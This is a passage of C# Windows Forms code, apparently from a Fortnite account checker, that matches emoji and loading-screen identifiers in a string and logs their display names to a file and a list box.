                                sw.WriteLine("=> Sucker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sucker");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime81 = x.Contains("emoji_thief");
                            if (EmojiFindTime81)
                            {
                                sw.WriteLine("=> Thief");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Thief");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime82 = x.Contains("emoji_thumbsdown");
                            if (EmojiFindTime82)
                            {
                                sw.WriteLine("=> Thumbs Down");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Thumbs Down");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime83 = x.Contains("emoji_thumbsup");
                            if (EmojiFindTime83)
                            {
                                sw.WriteLine("=> Thumbs Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Thumbs Up");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime84 = x.Contains("emoji_wow");
                            if (EmojiFindTime84)
                            {
                                sw.WriteLine("=> Wow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wow");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime85 = x.Contains("emoji_bang");
                            if (EmojiFindTime85)
                            {
                                sw.WriteLine("=> Bang!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bang!");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime86 = x.Contains("emoji_battlebus");
                            if (EmojiFindTime86)
                            {
                                sw.WriteLine("=> Battle Bus");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Battle Bus");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime87 = x.Contains("emoji_blackcat");
                            if (EmojiFindTime87)
                            {
                                sw.WriteLine("=> Black Cat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Black Cat");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime88 = x.Contains("emoji_camper");
                            if (EmojiFindTime88)
                            {
                                sw.WriteLine("=> Camper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Camper");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime89 = x.Contains("emoji_clown");
                            if (EmojiFindTime89)
                            {
                                sw.WriteLine("=> Clown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clown");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime90 = x.Contains("emoji_ghost");
                            if (EmojiFindTime90)
                            {
                                sw.WriteLine("=> Ghost");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ghost");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime91 = x.Contains("emoji_meet");
                            if (EmojiFindTime91)
                            {
                                sw.WriteLine("=> Meeet");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Meeet");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime92 = x.Contains("emoji_plunger");
                            if (EmojiFindTime92)
                            {
                                sw.WriteLine("=> Plunger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Plunger");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime93 = x.Contains("emoji_tp");
                            if (EmojiFindTime93)
                            {
                                sw.WriteLine("=> Tp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tp");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime94 = x.Contains("emoji_witchsbrew");
                            if (EmojiFindTime94)
                            {
                                sw.WriteLine("=> Gg Potion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gg Potion");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime95 = x.Contains("emoji_fiery");
                            if (EmojiFindTime95)
                            {
                                sw.WriteLine("=> Fiery");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fiery");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime96 = x.Contains("emoji_s6lvl100");
                            if (EmojiFindTime96)
                            {
                                sw.WriteLine("=> Season Level 100");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Season Level 100");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime97 = x.Contains("emoji_durrrburger");
                            if (EmojiFindTime97)
                            {
                                sw.WriteLine("=> Durrr Burger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Durrr Burger");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime98 = x.Contains("emoji_fkey");
                            if (EmojiFindTime98)
                            {
                                sw.WriteLine("=> F");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> F");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime99 = x.Contains("emoji_ggwreath");
                            if (EmojiFindTime99)
                            {
                                sw.WriteLine("=> GG Wreath");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> GG Wreath");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime100 = x.Contains("emoji_gingerbreadhappy");
                            if (EmojiFindTime100)
                            {
                                sw.WriteLine("=> Ginger Gunner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ginger Gunner");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime101 = x.Contains("emoji_gingerbreadmad");
                            if (EmojiFindTime101)
                            {
                                sw.WriteLine("=> Merry Marauder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Merry Marauder");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime102 = x.Contains("emoji_hotchocolate");
                            if (EmojiFindTime102)
                            {
                                sw.WriteLine("=> Hot Chocolate");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hot Chocolate");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime103 = x.Contains("emoji_huskwow");
                            if (EmojiFindTime103)
                            {
                                sw.WriteLine("=> Amazed");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Amazed");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime104 = x.Contains("emoji_iceheart");
                            if (EmojiFindTime104)
                            {
                                sw.WriteLine("=> Icy Heart");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Icy Heart");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime105 = x.Contains("emoji_mistletoe");
                            if (EmojiFindTime105)
                            {
                                sw.WriteLine("=> Mistletoe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mistletoe");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime106 = x.Contains("emoji_mittens");
                            if (EmojiFindTime106)
                            {
                                sw.WriteLine("=> Mittens");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mittens");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime107 = x.Contains("emoji_penguin");
                            if (EmojiFindTime107)
                            {
                                sw.WriteLine("=> Penguin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Penguin");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime108 = x.Contains("emoji_pizza");
                            if (EmojiFindTime108)
                            {
                                sw.WriteLine("=> Tbd");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tbd");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime109 = x.Contains("emoji_s7lvl100");
                            if (EmojiFindTime109)
                            {
                                sw.WriteLine("=> Season Level 100");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Season Level 100");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime110 = x.Contains("emoji_snowflake");
                            if (EmojiFindTime110)
                            {
                                sw.WriteLine("=> Snowflake");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snowflake");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime111 = x.Contains("emoji_snowman");
                            if (EmojiFindTime111)
                            {
                                sw.WriteLine("=> Snowman");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snowman");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                        }
                        int TotalLoadingScreens = 0;
                        if (CheckForLoadingScreens.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Loading Screens>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Loading Screens>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool LoadingScreens = x.Contains("AthenaLoadingScreen:lsid_001_brite");
                            if (LoadingScreens)
                            {
                                sw.WriteLine("=> Brite Unicorn");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brite Unicorn");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens1 = x.Contains("AthenaLoadingScreen:lsid_002_raptor");
                            if (LoadingScreens1)
                            {
                                sw.WriteLine("=> Raptor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raptor");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens2 = x.Contains("AthenaLoadingScreen:lsid_003_pickaxes");
                            if (LoadingScreens2)
                            {
                                sw.WriteLine("=> Harvesting Tools");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Harvesting Tools");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens3 = x.Contains("AthenaLoadingScreen:lsid_004_tacticalshotgun");
                            if (LoadingScreens3)
                            {
                                sw.WriteLine("=> Tactical Shotgun");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tactical Shotgun");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens4 = x.Contains("AthenaLoadingScreen:lsid_005_suppressedpistol");
                            if (LoadingScreens4)
                            {
                                sw.WriteLine("=> Suppressed Pistol");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Suppressed Pistol");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens5 = x.Contains("AthenaLoadingScreen:lsid_006_minigun");
                            if (LoadingScreens5)
                            {
                                sw.WriteLine("=> Minigun");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Minigun");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens6 = x.Contains("AthenaLoadingScreen:lsid_007_tacticalcommando");
                            if (LoadingScreens6)
                            {
                                sw.WriteLine("=> Elite Agent");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Elite Agent");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens7 = x.Contains("AthenaLoadingScreen:lsid_008_keyart");
                            if (LoadingScreens7)
                            {
                                sw.WriteLine("=> Battle Royale");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Battle Royale");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens8 = x.Contains("AthenaLoadingScreen:lsid_009_s4cumulative1");
                            if (LoadingScreens8)
                            {
                                sw.WriteLine("=> Quiet on the Set!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Quiet on the Set!");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens9 = x.Contains("AthenaLoadingScreen:lsid_010_s4cumulative2");
                            if (LoadingScreens9)
                            {
                                sw.WriteLine("=> At Last... I Am Free");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> At Last... I Am Free");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens10 = x.Contains("AthenaLoadingScreen:lsid_011_s4cumulative3");
                            if (LoadingScreens10)
                            {
                                sw.WriteLine("=> A Looming Threat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> A Looming Threat");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens11 = x.Contains("AthenaLoadingScreen:lsid_012_s4cumulative4");
                            if (LoadingScreens11)
                            {
                                sw.WriteLine("=> Retribution");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Retribution");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens12 = x.Contains("AthenaLoadingScreen:lsid_013_s4cumulative5");
                            if (LoadingScreens12)
                            {
                                sw.WriteLine("=> Showdown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Showdown");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens13 = x.Contains("AthenaLoadingScreen:lsid_014_s4cumulative6");
                            if (LoadingScreens13)
                            {
                                sw.WriteLine("=> That's a Wrap!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> That's a Wrap!");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens14 = x.Contains("AthenaLoadingScreen:lsid_015_s4cumulative7");
                            if (LoadingScreens14)
                            {
                                sw.WriteLine("=> The Visitor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Visitor");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens15 = x.Contains("AthenaLoadingScreen:lsid_016_llamasniper");
                            if (LoadingScreens15)
                            {
                                sw.WriteLine("=> Llama Spotted");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Llama Spotted");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens16 = x.Contains("AthenaLoadingScreen:lsid_017_carbide");
                            if (LoadingScreens16)
                            {
                                sw.WriteLine("=> Carbide");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Carbide");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens17 = x.Contains("AthenaLoadingScreen:lsid_018_rex");
                            if (LoadingScreens17)
                            {
                                sw.WriteLine("=> Rex");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rex");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens18 = x.Contains("AthenaLoadingScreen:lsid_019_tacticaljungle");
                            if (LoadingScreens18)
                            {
                                sw.WriteLine("=> Squad Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Squad Leader");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens19 = x.Contains("AthenaLoadingScreen:lsid_020_supplydrop");
                            if (LoadingScreens19)
                            {
                                sw.WriteLine("=> Supply Drop");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Supply Drop");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens20 = x.Contains("AthenaLoadingScreen:lsid_021_leviathan");
                            if (LoadingScreens20)
                            {
                                sw.WriteLine("=> Leviathan");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Leviathan");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens21 = x.Contains("AthenaLoadingScreen:lsid_022_britegunner");
                            if (LoadingScreens21)
                            {
                                sw.WriteLine("=> Brite Gunner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brite Gunner");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens22 = x.Contains("AthenaLoadingScreen:lsid_023_candy");
                            if (LoadingScreens22)
                            {
                                sw.WriteLine("=> Zoey");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Zoey");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens23 = x.Contains("AthenaLoadingScreen:lsid_024_graffiti");
                            if (LoadingScreens23)
                            {
                                sw.WriteLine("=> Aerosol Assassins");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Aerosol Assassins");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens24 = x.Contains("AthenaLoadingScreen:lsid_025_raven");
                            if (LoadingScreens24)
                            {
                                sw.WriteLine("=> Raven");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raven");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens25 = x.Contains("AthenaLoadingScreen:lsid_026_s4cumulative8");
                            if (LoadingScreens25)
                            {
                                sw.WriteLine("=> Retrofit");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Retrofit");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens26 = x.Contains("AthenaLoadingScreen:lsid_027_s5cumulative1");
                            if (LoadingScreens26)
                            {
                                sw.WriteLine("=> Road Trip!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Road Trip!");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens27 = x.Contains("AthenaLoadingScreen:lsid_028_s5cumulative2");
                            if (LoadingScreens27)
                            {
                                sw.WriteLine("=> Fairway Fun");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fairway Fun");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens28 = x.Contains("AthenaLoadingScreen:lsid_029_s5cumulative3");
                            if (LoadingScreens28)
                            {
                                sw.WriteLine("=> Track Record");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Track Record");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens29 = x.Contains("AthenaLoadingScreen:lsid_030_s5cumulative4");
                            if (LoadingScreens29)
                            {
                                sw.WriteLine("=> Poolside Paradise");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Poolside Paradise");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens30 = x.Contains("AthenaLoadingScreen:lsid_031_s5cumulative5");
                            if (LoadingScreens30)
                            {
                                sw.WriteLine("=> Blast From the Past");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blast From the Past");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens31 = x.Contains("AthenaLoadingScreen:lsid_032_s5cumulative6");
                            if (LoadingScreens31)
                            {
                                sw.WriteLine("=> Opening Night");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Opening Night");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens32 = x.Contains("AthenaLoadingScreen:lsid_033_s5cumulative7");
                            if (LoadingScreens32)
                            {
                                sw.WriteLine("=> Tbd");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tbd");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens33 = x.Contains("AthenaLoadingScreen:lsid_034_abstrakt");
                            if (LoadingScreens33)
                            {
                                sw.WriteLine("=> Abstrakt");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Abstrakt");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens34 = x.Contains("AthenaLoadingScreen:lsid_035_bandolier");
                            if (LoadingScreens34)
                            {
                                sw.WriteLine("=> Bandolier");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bandolier");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens35 = x.Contains("AthenaLoadingScreen:lsid_036_drift");
                            if (LoadingScreens35)
                            {
                                sw.WriteLine("=> Drift");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Drift");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens36 = x.Contains("AthenaLoadingScreen:lsid_037_tomatohead");
                            if (LoadingScreens36)
                            {
                                sw.WriteLine("=> Tomatohead");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tomatohead");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens37 = x.Contains("AthenaLoadingScreen:lsid_038_highexplosives");
                            if (LoadingScreens37)
                            {
                                sw.WriteLine("=> High Explosives");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> High Explosives");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens38 = x.Contains("AthenaLoadingScreen:lsid_039_jailbirds");
                            if (LoadingScreens38)
                            {
                                sw.WriteLine("=> Jailbirds");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jailbirds");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens39 = x.Contains("AthenaLoadingScreen:lsid_040_lifeguard");
                            if (LoadingScreens39)
                            {
                                sw.WriteLine("=> Sun Strider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sun Strider");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens40 = x.Contains("AthenaLoadingScreen:lsid_041_supplyllama");
                            if (LoadingScreens40)
                            {
                                sw.WriteLine("=> Supply Llama");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Supply Llama");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens41 = x.Contains("AthenaLoadingScreen:lsid_042_omen");
                            if (LoadingScreens41)
                            {
                                sw.WriteLine("=> Omen");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Omen");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens42 = x.Contains("AthenaLoadingScreen:lsid_043_redknight");
                            if (LoadingScreens42)
                            {
                                sw.WriteLine("=> Red Knight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Red Knight");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens43 = x.Contains("AthenaLoadingScreen:lsid_044_flytrap");
                            if (LoadingScreens43)
                            {
                                sw.WriteLine("=> Flytrap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flytrap");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens44 = x.Contains("AthenaLoadingScreen:lsid_045_vikingfemale");
                            if (LoadingScreens44)
                            {
                                sw.WriteLine("=> Huntress");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Huntress");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens45 = x.Contains("AthenaLoadingScreen:lsid_046_vikingpattern");
                            if (LoadingScreens45)
                            {
                                sw.WriteLine("=> Norse Emblem");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Norse Emblem");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens46 = x.Contains("AthenaLoadingScreen:lsid_047_s5cumulative8");
                            if (LoadingScreens46)
                            {
                                sw.WriteLine("=> Tomato Trek");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tomato Trek");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens47 = x.Contains("AthenaLoadingScreen:lsid_048_s5cumulative9");
                            if (LoadingScreens47)
                            {
                                sw.WriteLine("=> Tbd");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tbd");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens48 = x.Contains("AthenaLoadingScreen:lsid_049_s5cumulative10");
                            if (LoadingScreens48)
                            {
                                sw.WriteLine("=> Dark Reflection");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Reflection");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens49 = x.Contains("AthenaLoadingScreen:lsid_050_tomatotemple");
                            if (LoadingScreens49)
                            {
                                sw.WriteLine("=> Tomato Temple");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tomato Temple");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens50 = x.Contains("AthenaLoadingScreen:lsid_051_ravage");
                            if (LoadingScreens50)
                            {
                                sw.WriteLine("=> Ravage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ravage");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens51 = x.Contains("AthenaLoadingScreen:lsid_052_emoticoncollage");
                            if (LoadingScreens51)
                            {
                                sw.WriteLine("=> Emoticons!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Emoticons!");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens52 = x.Contains("AthenaLoadingScreen:lsid_053_supplyllama");
                            if (LoadingScreens52)
                            {
                                sw.WriteLine("=> Supply Llama");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Supply Llama");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens53 = x.Contains("AthenaLoadingScreen:lsid_054_scuba");
                            if (LoadingScreens53)
                            {
                                sw.WriteLine("=> Chompmasters");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chompmasters");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens54 = x.Contains("AthenaLoadingScreen:lsid_055_valkyrie");
                            if (LoadingScreens54)
                            {
                                sw.WriteLine("=> Valkyrie");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Valkyrie");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens55 = x.Contains("AthenaLoadingScreen:lsid_056_fate");
                            if (LoadingScreens55)
                            {
                                sw.WriteLine("=> Fate");
                                if (ListBoxDisableText.Checked == false)
                                {
